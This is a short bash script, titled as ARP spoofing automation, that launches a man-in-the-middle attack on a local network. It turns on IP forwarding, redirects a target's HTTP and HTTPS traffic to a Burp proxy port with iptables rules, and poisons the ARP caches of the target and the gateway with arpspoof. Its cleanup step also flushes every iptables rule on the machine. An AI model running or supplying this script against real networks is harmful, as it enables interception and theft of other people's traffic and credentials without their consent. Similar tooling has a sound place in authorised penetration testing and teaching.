#!/bin/bash
# ARP Spoofing Automation Script

TARGET_IP="192.168.0.102"
GATEWAY_IP="192.168.0.1"
INTERFACE="wlan0"
BURP_PORT="8080"

echo "[*] Enabling IP Forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1

echo "[*] Setting iptables rules..."
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port $BURP_PORT
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port $BURP_PORT

echo "[*] Starting ARP Spoofing (Press Ctrl+C to stop)..."
sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP

echo "[*] Cleaning up..."
sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -F
sudo iptables -t nat -F
